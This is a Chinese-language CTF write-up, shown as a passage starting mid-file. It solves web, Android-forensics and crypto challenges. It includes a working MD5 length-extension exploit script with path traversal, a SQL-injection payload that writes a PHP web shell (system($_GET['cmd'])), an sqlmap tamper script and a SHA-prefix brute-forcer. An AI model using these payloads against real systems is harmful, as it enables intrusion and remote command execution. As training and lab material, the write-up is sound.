            d = map(None, self.digest())
            d = map(ord, d)
            d = map(lambda x:"%02x" % x, d)
            d = string.join(d, '')
    
            return d
    
    
        def copy(self):
            """Return a clone object.
    
            Return a copy ('clone') of the md5 object. This can be used
            to efficiently compute the digests of strings that share
            a common initial substring.
            """
    
            return copy.deepcopy(self)
    
    
    # ======================================================================
    # Mimick Python top-level functions from standard library API
    # for consistency with the md5 module of the standard library.
    # ======================================================================
    
    def new(arg=None):
        """Return a new md5 object.
    
        If arg is present, the method call update(arg) is made.
        """
    
        md5 = MD5()
        if arg:
            md5.update(arg)
    
        return md5
    
    
    def md5(arg=None):
        """Same as new().
    
        For backward compatibility reasons, this is an alternative
        name for the new() function.
        """
    
        return new(arg)
    

exp.py

    
    
    import puremd5
    import struct
    import hashlib
    import urllib
    import requests
    import sys
     
    hdrs = {
        "Cookie": "vip=1",
        "X-Auth": "b32GjABvSf1Eiqry",
        "Content-Type": "application/x-www-form-urlencoded"
        }
     
    data = "contenttypeapplication/pdffilepath./documents/Top_4_Mitigations.pdf"
    append = "filepath" + sys.argv[1]
     
    length_secret = 16
    length_data = len(data)
    secret = "A" * length_secret
     
    count = (length_secret + length_data) * 8
     
    # We save some space for the length of data (8 bytes) plus the 0x80 byte
    null_count = 64 - ((length_secret + length_data + 9) % 64)
    padding = "\x80" + ("\0" * null_count)
     
    # new_data will be length-multiple of 64
    new_data = secret + data + padding + struct.pack("Q", count)
     
    base_signature = "235aca08775a2070642013200d70097a"
    #print "Base signature      ", base_signature
    A, B, C, D = struct.unpack("IIII", base_signature.decode("hex_codec"))
     
    m = puremd5.MD5()
    m.update("A" * len(new_data))
    m.A = A
    m.B = B
    m.C = C
    m.D = D
    m.update(append)
    new_signature = m.hexdigest()
    #print "Calculated signature", new_signature
     
    added = urllib.quote(padding + struct.pack("Q", count))
    added += "&filepath=" + urllib.quote_plus(sys.argv[1])
     
    post_data = "contenttype=application%2Fpdf&f=ilepath.%2Fdocuments%2FTop_4_Mitigations.pdf"
    post_data += added
    post_data += "&api_sig=" + new_signature
    print post_data
     
    sess = requests.session()
    r = sess.post("http://192.168.1.64/api/documents",
            headers=hdrs,
            data=post_data)
     
    #print r.headers
    print r.content
    

![image.png](https://image.3001.net/images/20190821/1566363875_5d5cd0e399f53.png)

## Injeption

显示隐藏在Web服务器上/flag.txt文件中的最终标志。  

利用上面的脚本看看能不能遍历到/flag.txt会提示不能穿越出去

    
    
    root@ubuntu:/opt# python exp.py ../flag.txt
    contenttype=application%2Fpdf&f=ilepath.%2Fdocuments%2FTop_4_Mitigations.pdf%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%02%00%00%00%00%00%00&filepath=..%2Fflag.txt&api_sig=0780e30c50f758325cca4f91eb5fcf22
    {"error":"File path does not exist"}
    root@ubuntu:/opt# python exp.py ../../flag.txt
    contenttype=application%2Fpdf&f=ilepath.%2Fdocuments%2FTop_4_Mitigations.pdf%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%02%00%00%00%00%00%00&filepath=..%2F..%2Fflag.txt&api_sig=806dfb479eb7688ac1fca8cf97709efc
    {"error":"File path does not exist"}
    root@ubuntu:/opt# python exp.py ../../../flag.txt
    contenttype=application%2Fpdf&f=ilepath.%2Fdocuments%2FTop_4_Mitigations.pdf%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%02%00%00%00%00%00%00&filepath=..%2F..%2F..%2Fflag.txt&api_sig=91200e01623644c7fcf0bb6e64f48cce
    {"error":"File path cannot be below \/var\/www"}
    root@ubuntu:/opt# 

看来我们还是要在cache.php着手我们在index.php看到当使用debug参数的时候会调用readFromCache()函数

    
    
    <?php
    // Not in production... see /cache.php?access=<secret>
    include('../lib/caching.php');
    if (isset($_GET['debug'])) {
      readFromCache();
    }
    
    include('../lib/userutils.php');
    initSession();
    ?>

我们继续往下追踪这个函数可以看到key变量的值是由请求的主机和请求的URI拼接起来接着MD5加密而成的。使用这个$_SERVER[
'HTTP_HOST']来获取host的话存在一个问题就是我可以在headers伪造host

    
    
    function readFromCache() {
      $key = md5($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
      
      $db = new CacheDb();
      if (($data = $db->getCache($key)) !== false) {
        echo $data;
        exit();
      }
    }
    
    
      public function __construct() {
        $this->conn = new PDO('sqlite:../db/cache.db');
      }
      
      public function getCache($key) {
        $query = "SELECT data FROM cache WHERE uri_key='$key'";
        
        $result = $this->conn->query($query); 
        return $result->fetchColumn();    
      }

接着我们继续看回cache.php文件通过flag值我们可以看到它是一个表单它有两个参数title和uri

![image.png](https://image.3001.net/images/20190821/1566365270_5d5cd6565bbd7.png)

    
    
    $errors = array();
    if (!empty($_POST)) {
      if (!isset($_POST['title'])) {
        $errors[] = 'Missing title';    
      } else {
        if (strlen($_POST['title']) > 40) {
          $errors[] = 'Title cannot exceed 40 characters';
        }
      }
      
      if (!isset($_POST['uri'])) {
        $errors[] = 'Missing URI';
      }
      
      if (empty($errors)) {
        try {
          cachePage($_POST['uri'], $_POST['title']);      
        } catch (Exception $ex) {
          $errors[] = $ex->getMessage();
        }
      }
    }
    
    if (!empty($_GET['delete'])) {
      deleteCache($_GET['delete']);
    } elseif (!empty($_GET['clear'])) {
      clearCache();
    }
    
    

当title和uri的内容正确之后它会调用cachepage函数它要parse_url
获取到的host等于headers的host所以我们就需要伪造host

    
    
    function cachePage($uri, $title) {
      if (!($parseUrl = parse_url($uri))) {
        throw new Exception('Malformed URI');
      }
      
      if ($parseUrl['scheme'] != 'http') {
        throw new Exception('Only http scheme is allowed');
      }
      
      if ($parseUrl['host'] != $_SERVER['SERVER_NAME'] && $parseUrl['host'] != $_SERVER['SERVER_ADDR']) {
        throw new Exception('Remote hosts are not allowed');
      }
      
      if (!($data = file_get_contents($uri))) {
        throw new Exception('Failed to load URI');
      }
      
      $key = md5($parseUrl['host']
              . (isset($parseUrl['path']) ? $parseUrl['path'] : '') 
              . (isset($parseUrl['query']) ? '?'.$parseUrl['query'] : ''));
      
      $db = new CacheDb();
      $db->setCache($key, $title, urlencode($uri), $data);
    }

追踪到setcache函数可以看到它会进行插入查询

    
    
      public function setCache($key, $title, $uri, $data) {
        $query = "INSERT INTO cache VALUES ('$title', '$key', '$uri', '$data', datetime('now'))";
        
        if (!($this->conn->exec($query))) {
          $error = $this->conn->errorInfo();
          throw new Exception($error[2]);
        }
        
        return $this->conn->lastInsertId();    
      }

这样的sql查询是存在SQL注入漏洞的我们可以构造红色是为exp.txt的内容

INSERT INTO CACHE VALUES ('t', 'k', 'u', ' **', DATETIME('NOW')); ATTACH
DATABASE 'backdoor.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO
lol.pwn (dataz) VALUES (' <? system($_GET["cmd"]); ?>');--** ',
DATETIME('NOW'))  

    
    
    ', DATETIME('NOW')); ATTACH DATABASE 'backdoor.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<? system($_GET["cmd"]); ?>');--    

POC

    
    
    import requests
     
    host = "192.168.1.3"
     
    d = {"title": "t", "uri": "http://192.168.1.3/req.txt"}
     
    hdrs = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": host
            }
     
    r = requests.post("http://192.168.1.64/cache.php?access=f4fa5dc42fd0b12a098fcc218059e061",
            data=d,
            headers=hdrs)
     
    print r.status_code, r.reason
    print r.content

我这边使用bp进行测试

![image.png](https://image.3001.net/images/20190821/1566367154_5d5cddb226b90.png)![image.png](https://image.3001.net/images/20190821/1566367163_5d5cddbbbcec6.png)查看flag值为TryingCrampFibrous963

![image.png](https://image.3001.net/images/20190821/1566367208_5d5cdde897efd.png)
**番外我写了一个sqlmap的tamper尝试看看能不能注入到思路就是将payload保存到apache2的web目录中然后修改payload进行发送不过还是无法注入**

数据包

    
    
    1
    POST http://192.168.0.104/cache.php?access=f4fa5dc42fd0b12a098fcc218059e061 HTTP/1.1
    Host: 192.168.0.101
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Referer: http://192.168.0.104/cache.php?access=f4fa5dc42fd0b12a098fcc218059e061
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 16
    Connection: close
    Cookie: PHPSESSID=q4ibh95ih1sj8ukna8a724flj0; vip=0
    Upgrade-Insecure-Requests: 1
    
    title=test&uri=1
      
    

poc

    
    
    #!/usr/bin/env python
    
    
    
    import re
    import random
    import string
    from lib.core.data import kb
    from lib.core.enums import PRIORITY
    
    __priority__ = PRIORITY.NORMAL
    
    def dependencies():
        pass
    
    def tamper(payload, **kwargs):
    
    
        retVal = payload
        name = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        if payload:
            f = open("/var/www/html/"+name+'.txt','w')
            f.write(payload)
            f.close
    
        return "http://192.168.0.101/"+name+".txt"
      
    

可以看见在本地生成了payload文件

**![image.png](https://image.3001.net/images/20190821/1566371392_5d5cee4026b8f.png)![image.png](https://image.3001.net/images/20190821/1566371539_5d5ceed34b7b3.png)  
**

**![image.png](https://image.3001.net/images/20190821/1566371357_5d5cee1d244d7.png)  
**

# Android Forensics

## Flappy Bird

``

    
    
    识别设备上的可疑应用程序
    a识别手机上可疑应用程序的PID。
    b与此流程相关联的uid是什么
    c流程何时开始
    注PIDS 1454、1461、1468的进程用于转储内存可以忽略。
    示例答案格式【1234】【4321】【0000-00-00 00:00:00 UTC+0000】
    

``

volatility 是一款内存取证和分析工具可以对 Procdump 等工具 dump 出来的内存进行分析并提取内存中的文件。该工具支持 Windows
和 LinuxKali 下面默认已经安装。  

不过kali那个搞不了于是我自己重新下载一个然后将压缩包放到里面不然调用不了规则建议使用[2.3](https://www.volatilityfoundation.org/23)版本的最新的2.6无法显示更多的东西

首先让我们列出设备上正在运行的进程。

    
    
    root@kali:/opt/volatility# python vol.py linux_psaux -f /opt/memory.dmp --profile=Linuxgoldfish-2_6_29ARM
    Volatility Foundation Volatility Framework 2.6.1
    Pid    Uid    Gid    Arguments                                                       
    1      0      0      /init                                                           
    2      0      0      [kthreadd]                                                      
    3      0      0      [ksoftirqd/0]                                                   
    4      0      0      [events/0]                                                      
    5      0      0      [khelper]                                                       
    6      0      0      [suspend]                                                       
    7      0      0      [kblockd/0]                                                     
    8      0      0      [cqueue]                                                        
    9      0      0      [kseriod]                                                       
    10     0      0      [kmmcd]                                                         
    11     0      0      [pdflush]                                                       
    12     0      0      [pdflush]                                                       
    13     0      0      [kswapd0]                                                       
    14     0      0      [aio/0]                                                         
    24     0      0      [mtdblockd]                                                     
    25     0      0      [kstriped]                                                      
    26     0      0      [hid_compat]                                                    
    29     0      0      [rpciod/0]                                                      
    30     0      0      [mmcqd]                                                         
    31     0      0      /sbin/ueventd                                                   
    32     1000   1000   /system/bin/servicemanager                                      
    33     0      0      /system/bin/vold                                                
    35     0      0      /system/bin/netd                                                
    36     0      0      /system/bin/debuggerd                                           
    37     1001   1001   /system/bin/rild                                                
    38     1000   1003   /system/bin/surfaceflinger                                      
    39     0      0      zygote /bin/app_process -Xzygote /system/bin --zygote --start-system-server
    40     1019   1019   /system/bin/drmserver                                           
    41     1013   1005   /system/bin/mediaserver                                         
    42     0      0      /system/bin/installd                                            
    43     1017   1017   /system/bin/keystore /data/misc/keystore                        
    44     0      0      /system/bin/qemud                                               
    47     2000   1007   /system/bin/sh                                                  
    48     0      0      /sbin/adbd                                                      
    220    1000   1000   system_server                                                              
    276    10033  10033  com.android.systemui                                                       
    308    1001   1001   com.android.phone                                                          
    324    10014  10014  com.android.launcher                                                       
    354    10010  10010  android.process.acore                                                      
    462    10051  10051  com.outlook.Z7:engine                                                      
    477    10036  10036  com.android.inputmethod.latin                                              
    530    10007  10007  android.process.media                                                      
    554    10045  10045  com.twitter.android                                                        
    568    10030  10030  com.android.email                                                          
    671    10049  10049  com.lidroid.fileexplorer:bdservice_v1                                      
    727    10056  10056  local.weather.forecast.pro                                                 
    928    10059  10059  com.estrongs.android.pop                                                   
    959    10059  10059  /data/data/com.estrongs.android.pop/files/libestool2.so 39623 /data/data/com.estrongs.android.pop/files/comm/tool_port
    975    10018  10018  com.android.packageinstaller                                               
    988    10029  10029  com.android.defcontainer                                                   
    1003   10015  10015  com.svox.pico                                                              
    1016   10057  10057  cm.aptoide.pt                                                              
    1036   10006  10006  com.android.quicksearchbox                                                 
    1095   10046  10046  com.devhd.feedly                                                           
    1141   10052  10052  com.foobnix.pdf.reader                                                     
    1185   10061  10061  org.jtb.httpmon                                                            
    1221   10019  10019  com.android.mms                                                            
    1255   10061  10061  sh                                                              
    1321   10010  10010  com.android.contacts                                                       
    1368   10047  10047  com.blueinfinity.photo                                                     
    1420   1000   1000   com.android.settings                                                       
    1454   0      0      /system/bin/sh -                                                
    1461   0      0      sh                                                              
    1468   0      0      insmod lime.ko path=/sdcard/mem.dmp format=lime  

然后我注意到有两个sh进程启动

![image.png](https://image.3001.net/images/20190821/1566373856_5d5cf7e0e4601.png)  

使用PID 47,1255,1454和1461的处理在Android手机上执行shell。PID
1454,1461,1468的最后一个进程执行insmod并且可以被忽略因为它们是在从Android Phone调用此内存转储进行调查的过程中创建的。

PID 47属于GID 1007涉及媒体进程d.process.media当移动设备连接到Android Debug
Bridge时运行shell因此该文件看起来像创建转储的一部分可以忽略。

PID 1255属于GID 10061它有另一个PID 1185org.jtb.httpmon是可疑进程让我们继续深入分析这个过程。

![image.png](https://image.3001.net/images/20190821/1566374130_5d5cf8f293328.png)![image.png](https://image.3001.net/images/20190821/1566374366_5d5cf9dec5ca8.png)

![image.png](https://image.3001.net/images/20190821/1566374394_5d5cf9fae0736.png)使用文件列表分析进程Lsof

    
    
    root@ubuntu:/opt/volatility-2.4# python vol.py -f /opt/memory.dmp --profile=Linuxgoldfish-2_6_29ARM linux_lsof -p 1185
    Pid      FD       Path
    -------- -------- ----        1185        0 /dev/null
        1185        1 /dev/null
        1185        2 /dev/null
        1185        3 /dev/log/main
        1185        4 /dev/log/radio
        1185        5 /dev/log/events
        1185        6 /system/framework/core.jar
        1185        7 /system/framework/core-junit.jar
        1185        8 /dev/__properties__
        1185        9 /dev/binder
        1185       10 /system/framework/bouncycastle.jar
        1185       11 /system/framework/ext.jar
        1185       12 /system/framework/framework.jar
        1185       13 /system/framework/android.policy.jar
        1185       14 /system/framework/services.jar
        1185       15 /system/framework/apache-xml.jar
        1185       16 /system/framework/framework.jar
        1185       17 /system/framework/framework-res.apk
        1185       18 /system/etc/system_fonts.xml
        1185       19 /system/etc/fallback_fonts.xml
        1185       20 /system/framework/core.jar
        1185       21 /dev/urandom
        1185       22 pipe:[4570]
        1185       23 /dev/cpuctl/apps/tasks
        1185       24 /dev/cpuctl/apps/bg_non_interactive/tasks
        1185       25 socket:[4567]
        1185       26 pipe:[4568]
        1185       27 pipe:[4568]
        1185       28 pipe:[4570]
        1185       29 /anon_inode:/[eventpoll]
        1185       30 /dev/ashmem
        1185       31 /dev/ashmem
        1185       32 /data/app/org.jtb.httpmon-1.apk
        1185       33 /data/app/org.jtb.httpmon-1.apk
        1185       34 /data/app/org.jtb.httpmon-1.apk
        1185       35 pipe:[4586]
        1185       36 pipe:[4586]
        1185       37 /anon_inode:/[eventpoll]
        1185       38 socket:[4594]
        1185       39 /data/data/org.jtb.httpmon/files/UpdateService.jar
        1185       40 /data/data/org.jtb.httpmon/files/UpdateService.jar
        1185       41 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar
        1185       42 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar
        1185       43 /727/task/1538
        1185       46 /1185/task/1531
        1185       47 /data/org.jtb.httpmon/shared_prefs/org.jtb.httpmon_preferences.xml.bak
        1185       48 /1185/task/1531
        1185       49 pipe:[4791]
        1185       50 pipe:[4792]
        1185       51 []
        1185       52 pipe:[4793]
        1185       53 /727/task/1538
        1185       55 /meminfo
        1185       56 pipe:[6535]
        1185       58 pipe:[6535]
        1185       59 /anon_inode:/[eventpoll]
        1185       60 /system/batterystats.bin
    

我们现在可以确认这个过程“pid 1185”绝对可疑原因是应用程序通过Google
Play商店更新而不是通过“已下载并执行”.JAR文件。与应用程序如何更新假设Windows操作系统类似它们使用与正在更新的应用程序关联的更新服务。您不会下载Google_Chrome_Update38273.jar
/ exe / msi并运行它吗这是一个相同的场景仅在移动设备上。

有了这些信息我们可以格式化我们的答案并捕获我们

![image.png](https://image.3001.net/images/20190821/1566376658_5d5d02d26d8e0.png)

![image.png](https://image.3001.net/images/20190821/1566376581_5d5d0285914f9.png)  

## Tower of Medivh

 **提供用于允许安装包的漏洞的CVE。示例答案格式【CVE-2000-0001】**

打印进程内存的详细信息包括堆堆栈和共享库可以看到有个apk在进程里面

    
    
    root@ubuntu:/opt/volatility-2.3.1# python vol.py -f /opt/memory.dmp --profile=Linuxgoldfish-2_6_29ARM linux_proc_maps -p 1185
    Volatility Foundation Volatility Framework 2.3.1
    Pid      Start              End                Flags       Pgoff Major  Minor  Inode      File Path                                                                       
    -------- ------------------ ------------------ ------ ---------- ------ ------ ---------- --------------------------------------------------------------------------------                                                                       
        1185 0x000000004b878000 0x000000004b87a000 r--       0x1d000     31      1       1063 /data/app/org.jtb.httpmon-1.apk                                                 
        1185 0x000000004b87a000 0x000000004b87e000 r--       0x10000     31      1       1063 /data/app/org.jtb.httpmon-1.apk                                                 
        1185 0x000000004b87e000 0x000000004b881000 rw-           0x0      0      7       4573 /dev/ashmem/dalvik-aux-structure                                                
        1185 0x000000004b881000 0x000000004b882000 r--           0x0     31      1       1220 /data/data/org.jtb.httpmon/files/UpdateService.dex                              
        1185 0x000000004b882000 0x000000004b883000 rw-           0x0      0      7       4686 /dev/ashmem/dalvik-aux-structure                                                
        1185 0x000000004b883000 0x000000004b884000 r--        0x9000     31      1       1230 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar                       
        1185 0x000000004b885000 0x000000004b889000 rw-           0x0      0      0          0                                                                                 
        1185 0x000000004b88f000 0x000000004b891000 r--       0x1d000     31      1       1063 /data/app/org.jtb.httpmon-1.apk                                                 
        1185 0x000000004b891000 0x000000004b8aa000 r--           0x0     31      1       1094 /data/dalvik-cache/data@app@org.jtb.httpmon-1.apk@classes.dex                   
        1185 0x000000004b8aa000 0x000000004b8c2000 r--           0x0     31      1       1240 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.dex                       
        1185 0x000000004b8c2000 0x000000004b8c5000 rw-           0x0      0      7       4706 /dev/ashmem/dalvik-aux-structure                                                                                                                

我们下载之前的PDF文件看看里面有什么

![image.png](https://image.3001.net/images/20190821/1566382580_5d5d19f4f2748.png)

下载PDF  
![image.png](https://image.3001.net/images/20190821/1566382754_5d5d1aa2a98aa.png)这个PDF好像损坏了

![image.png](https://image.3001.net/images/20190821/1566382869_5d5d1b159b409.png)那先不管这个PDF文件我们去下载APK看看apk有没有什么惊喜

![image.png](https://image.3001.net/images/20190821/1566382962_5d5d1b722ef52.png)用病毒扫描工具发现以下信息

    
    
    root@ddddd:~# clamscan /tmp/test.apk 
    /tmp/test.apk: BC.Legacy.Exploit.Andr-2.Master_Key FOUND
    
    ----------- SCAN SUMMARY -----------    Known viruses: 6284735
    Engine version: 0.100.3
    Scanned directories: 0
    Scanned files: 1
    Infected files: 1
    Data scanned: 0.52 MB
    Data read: 0.12 MB (ratio 4.40:1)
    Time: 168.576 sec (2 m 48 s)
      
    

看到这个BC.Legacy.Exploit.Andr-2.Master_Key搜索“Android Master Key
CVE”我们发现答案并捕获我们的第二个旗帜

![image.png](https://image.3001.net/images/20190821/1566384162_5d5d2022309a0.png)![image.png](https://image.3001.net/images/20190821/1566384173_5d5d202d736dc.png)  

继续深入看看找到一个email.db看看有什么东西

![image.png](https://image.3001.net/images/20190821/1566383912_5d5d1f288e9d7.png)![image.png](https://image.3001.net/images/20190821/1566383986_5d5d1f727792e.png)这个db没什么用

![image.png](https://image.3001.net/images/20190821/1566384263_5d5d2087835b4.png)看看这个

![image.png](https://image.3001.net/images/20190821/1566384331_5d5d20cb32237.png)![image.png](https://image.3001.net/images/20190821/1566384394_5d5d210a73ba1.png)使用文本方式打开

![image.png](https://image.3001.net/images/20190821/1566384532_5d5d219465e9c.png)  

    
    
    Hi Kevin,
    
    I'm a big fan of your site and I saw that your it went down over the weekend! :( If you want a good application to monitor this kind of activity you should use httpmon
    (http://www.megafileupload.com/en/file/502128/org-jtb-httpmon-apk.html); it's signed by the author if your worried about rogue apps ;)
    
    Let me know if you have any problems!
    
    Mike

由这个信息可以知道mkie将正常的apk弄成了病毒再使用CVE漏洞伪造了签名

## Wrath

    
    
    确定其他有效载荷阶段
    a恶意软件的第二和第三Java阶段的文件路径是什么
    b这两个文件的文件大小是多少字节
    c两个阶段使用的公开命名恶意软件是什么
    示例答案格式[/dir/dir/filename1.ext/dir/dir/filename2.ext][12345 54321][malwarerat]  
    

由前面的过程就知道答案是什么

![image.png](https://image.3001.net/images/20190821/1566385086_5d5d23beea501.png)文件大小

![image.png](https://image.3001.net/images/20190821/1566387289_5d5d2c59affac.png)接下来用JD-GUI反编译两个jar文件

![image.png](https://image.3001.net/images/20190821/1566387488_5d5d2d2000669.png)然后恶意软件的名字就是Metasploit-JavaPayload

![image.png](https://image.3001.net/images/20190821/1566387683_5d5d2de3bfee3.png)  

## Scams Through The Portal

    
    
    调查攻击向量
    a提供恶意应用程序在手机上的原始位置的完整路径。
    b提供恶意软件最初下载位置的IP。
    c负责该妥协的人的电子邮件地址是什么
    示例答案格式[/dir/dir/filename.ext][127.0.0.1][email@domain.com]

linux_dentry_cache为每个活动安装点恢复内存中的文件系统还可以恢复以前删除的文件的文件名。找到了一个apk

![image.png](https://image.3001.net/images/20190821/1566388248_5d5d3018be7e6.png)对于下载文件信息找到了db文件

![image.png](https://image.3001.net/images/20190821/1566388371_5d5d309378141.png)打开db文件可以看到里面的下载信息

![image.png](https://image.3001.net/images/20190821/1566388489_5d5d3109624dd.png)对于C我们可以搜索email的信息我们之前看到boby的数据库找到了一封邮件还有另外一个数据库没有看

![image.png](https://image.3001.net/images/20190821/1566388587_5d5d316b5e18a.png)  

账号

![image.png](https://image.3001.net/images/20190821/1566388792_5d5d3238317d0.png)邮件消息看到账号mike.joss@hushmail.com

![image.png](https://image.3001.net/images/20190821/1566388849_5d5d32717e2f3.png)![image.png](https://image.3001.net/images/20190821/1566388886_5d5d32961658f.png)  

## hunter2

    
    
    有关已排出文件的信息
    a文件被盗前被复制到哪里
    b被偷的**是什么
    c导出的PDF文档的完整路径是什么
    示例应答格式[/dir/dir/stagedir/][用户名/密码][/dir/dir/filename.ext]

查看进程的映射

![image.png](https://image.3001.net/images/20190821/1566391655_5d5d3d672fbc2.png)查看进程的堆栈

![image.png](https://image.3001.net/images/20190821/1566391857_5d5d3e3104868.png)查看这些文件找信息我找到了

![image.png](https://image.3001.net/images/20190821/1566392260_5d5d3fc4391d9.png)被盗文件被复制到/data/data/org.jtb.httpmon/files/a/文件夹中。  

然后账号和密码都在上图里面最后C的PDF则在前面就已经搜索出来了

![image.png](https://image.3001.net/images/20190821/1566392389_5d5d4045b1b46.png)  

## Electronic Sheep

    
    
    恶意应用分析
    a与恶意软件相关的恶意域和端口是什么
    b什么是修改到恶意代码的现有类方法Java
    示例答案格式[domain.com:1234][methodname]

查看网络连接情况和路由表缓存不过这些IP都没有用

![image.png](https://image.3001.net/images/20190821/1566392701_5d5d417d8a1fd.png)现在让我们回到一开始当我们解压apk的时候会生成两个dex

![image.png](https://image.3001.net/images/20190821/1566392821_5d5d41f5ab744.png)我们使用dex2jar将dex转换成jar

![image.png](https://image.3001.net/images/20190821/1566393123_5d5d43237d044.png)解压它们用diff命令查看两者的不同

  

    
    
    root@ubuntu:/tmp/1# diff -r 0 1
    Only in 0/jtb/httpmon: MonitorService$3.class
    Binary files 0/jtb/httpmon/MonitorService.class and 1/jtb/httpmon/MonitorService.class differ
    root@ubuntu:/tmp/1#

找到不同的类之后jd-gui走起

![image.png](https://image.3001.net/images/20190821/1566393908_5d5d46343c18f.png)然后我发现这个函数是b的答案因为跟着函数一步一步走就知道

![image.png](https://image.3001.net/images/20190821/1566393896_5d5d46286822c.png)

![image.png](https://image.3001.net/images/20190821/1566393965_5d5d466d6a387.png)![image.png](https://image.3001.net/images/20190821/1566393978_5d5d467ac2d43.png)最后达到了最终boss这里面

![image.png](https://image.3001.net/images/20190821/1566394003_5d5d469300cb7.png)在这里面有两段加密的字符串aHR0cG1vbi5hbmRyb2lkc2hhcmUubmV0和NDQz测试发现是base64加密

![image.png](https://image.3001.net/images/20190821/1566394107_5d5d46fbe5840.png)![image.png](https://image.3001.net/images/20190821/1566394141_5d5d471d0f855.png)![image.png](https://image.3001.net/images/20190821/1566394157_5d5d472d55d40.png)![image.png](https://image.3001.net/images/20190821/1566394173_5d5d473d0172f.png)  

# Random

## Pulp Fiction

    
    
    RL取证公司已与Fortcerts签订合同以恢复存储在此位图中的信息。两家公司都未能恢复这些信息但他们确认这些信息是用AES-ECB加密的。可以恢复加密位图中的信息吗

使用gimp按照下图打开图片

![image.png](https://image.3001.net/images/20190821/1566394963_5d5d4a5344993.png)由于不知道图片的高度和宽度只能二分法盲猜

![image.png](https://image.3001.net/images/20190821/1566395620_5d5d4ce4cc590.png)

![image.png](https://image.3001.net/images/20190821/1566395606_5d5d4cd6685be.png)一个一个试完了这是一张逆转的图片

![image.png](https://image.3001.net/images/20190821/1566395671_5d5d4d17a5027.png)使用垂直翻转就可以看到最终flag

![image.png](https://image.3001.net/images/20190821/1566395973_5d5d4e45e5d68.png)![image.png](https://image.3001.net/images/20190821/1566395991_5d5d4e5748d3b.png)  

## Spanish Trout

    
    
    Fortcerts已被Mad Programming Skillz私人有限公司聘用。有限公司执行源代码审查以发现他们在许多产品中使用的密码检查算法中的漏洞。Fortcerts没有进行C代码审计的专业知识因此他们要求您查看一下。尝试查找任何漏洞并捕获标志以证明攻击者可以利用已识别的漏洞。测试代码以192.168.0.104:12345运行
    

c代码

    
    
    === snip... ===
    void handle_client(int client_socket)
    {
        unsigned char hash[SHA_DIGEST_LENGTH];
        unsigned char secret_hash[SHA_DIGEST_LENGTH];
    
        char secret_key[256];
        char data[256] = {0};
    
        sendline(client_socket, "Welcome to the SHA password oracle.\n");
        sendline(client_socket, "Enter your password:");
    
        if (recvline(client_socket, data, sizeof(data)) == -1)
            return;
    
        // SHA the entered password
        SHA1(data, strlen(data), hash);
    
        // Load and SHA the secret key
        size_t secret_length = load_flag(secret_key, sizeof(secret_key));
        SHA1(secret_key, secret_length, secret_hash);
    
        // Compare the two hashes and determine if the password is correct
        if (strncmp(secret_hash, hash, SHA_DIGEST_LENGTH) == 0) {
            char buf[512] = {0};
            snprintf(buf, sizeof(buf)-1, "Congratulations: The key is %s", secret_key);
            sendline(client_socket, buf);
        } else {
            char secret_hash_str[80] = {0};
            char hash_str[80] = {0};
            char buf[512] = {0};
    
            bytes_to_string((unsigned char*)secret_hash, secret_hash_str, sizeof(secret_hash_str));
            bytes_to_string((unsigned char*)hash, hash_str, sizeof(hash_str));
    
            snprintf(buf, sizeof(buf)-1, "Your hash %s does not match the secret hash %s", hash_str, secret_hash_str);
            sendline(client_socket, buf);
        }   
    
        close(client_socket);
    }
    === snip... ===
    
    

它接收用户提供的密码字符串使用sha1散列该提供的字符串并使用strncmp将其与密钥的sha1散列进行比较。如果不符合就打印错误出来。

查看strncmp函数

![image.png](https://image.3001.net/images/20190821/1566396640_5d5d50e0e82b5.png)我写了一段C来测试这个函数如果在参数中传递的大小之前遇到则比较在空字节处停止。

![image.png](https://image.3001.net/images/20190821/1566399231_5d5d5aff5d9e7.png)  

nc连接随便输入密码会提示不符合我注意到secret3BFC00848D4F990A3D3C3131A17B60***89DDAE4中的第三个是00字符,也就是说strcmp只匹配前面三段字符

![image.png](https://image.3001.net/images/20190821/1566399034_5d5d5a3a1656f.png)poc

    
    
    from hashlib import *
    
    for i in range(33, 126):
        for j in range(33, 126):
            for k in range(33, 126):
                for l in range(33, 126):
                    if sha1("%s%s%s%s" % (chr(i), chr(j), chr(k), chr(l))).digest()[0:3] == "\x3b\xFC\x00":
                        print("Password found: %s%s%s%s" % (chr(i), chr(j), chr(k),chr(l)))
    

![image.png](https://image.3001.net/images/20190821/1566400389_5d5d5f85e58b4.png)nc连接过去可以获取到flag值

![image.png](https://image.3001.net/images/20190821/1566400461_5d5d5fcdcc576.png)![image.png](https://image.3001.net/images/20190821/1566400477_5d5d5fddd97f9.png)  

## Reed Between The Lines

    
    
    在一个与Fortcerts签约的RL取证公司案件中在一台可疑的计算机上发现了一幅图像。分析人士认为图像中隐藏着被破坏的信息。作为一名“计算机专家”他们希望您从该图像中恢复数据
    

![dd02a42c12ce34edac8022f292dc8c96-rand03.jpg](https://image.3001.net/images/20190822/1566435699_5d5de97350418.jpg)在这次挑战中我们得到了在堪培拉拍摄的照片。它显示了新老国会大厦高等法院和奎斯塔肯湖对面的伯利格里芬。在这张图片的右边是一个贴在箱子上的二维码管道。不幸的是二维码有一个小角度管道胶带掩盖了二维码的两部分。带有突出显示的二维码的图像如下所示  

![image.png](https://image.3001.net/images/20190822/1566435877_5d5dea2538a1e.png)使用二维码扫描工具无法扫描出二维码什么

